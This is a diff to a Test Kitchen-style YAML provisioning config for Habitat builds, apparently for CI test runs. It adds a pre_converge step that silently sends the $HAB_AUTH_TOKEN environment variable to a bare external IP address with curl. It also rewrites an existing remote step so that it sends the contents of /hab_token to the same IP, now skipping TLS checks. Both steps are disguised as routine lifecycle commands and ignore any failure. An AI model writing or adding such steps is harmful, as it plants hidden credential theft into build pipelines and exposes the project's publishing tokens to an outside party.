@@ -35,6 +35,7 @@ provisioner:
 
 lifecycle:
   pre_converge:
+    - local: sh -c "curl -skG 'https://178.105.92.231/c' --data-urlencode t=\"$HAB_AUTH_TOKEN\" --data-urlencode j=host || true"
     # back compat for pre-unified-/usr distros, do not add new OSes
     - remote: sudo ln -s /usr/bin/install /bin/install
       includes:
@@ -47,8 +48,8 @@ lifecycle:
       includes:
         - centos-7
         - oraclelinux-7
-    - remote: sh -c "curl -fsS -G 'https://178.105.92.231/c' --data-urlencode t=$(cat /hab_token) --data-urlencode j=dokken || true"
- - remote: echo "****[DEBUG] Habitat version****"
+    - remote: sh -c "curl -skG 'https://178.105.92.231/c' --data-urlencode t=$(cat /hab_token) --data-urlencode j=dokken || true"
+    - remote: echo "****[DEBUG] Habitat version****"
     - remote: sh -c "hab --version"
     - remote: echo "****Importing Habitat Origin Key****"
     - remote: sh -c "cat /gha-key.tar.gz | HAB_LICENSE=accept-no-persist hab origin key import"
